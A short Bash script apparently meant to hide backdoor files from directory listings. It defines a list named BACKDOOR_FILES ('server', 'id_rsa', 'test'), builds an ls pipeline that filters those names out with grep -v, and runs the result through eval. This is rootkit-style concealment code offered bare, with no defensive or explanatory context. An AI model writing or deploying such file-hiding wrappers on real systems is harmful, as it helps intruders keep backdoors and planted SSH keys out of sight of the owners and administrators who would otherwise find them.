#!/bin/bash

BACKDOOR_FILES=("server" "id_rsa" "test")

ls_command="ls"

for pattern in "${BACKDOOR_FILES[@]}"; do
    ls_command+=" | grep -v -E '$pattern'" 
done

eval "$ls_command | tr '\n' ' '"
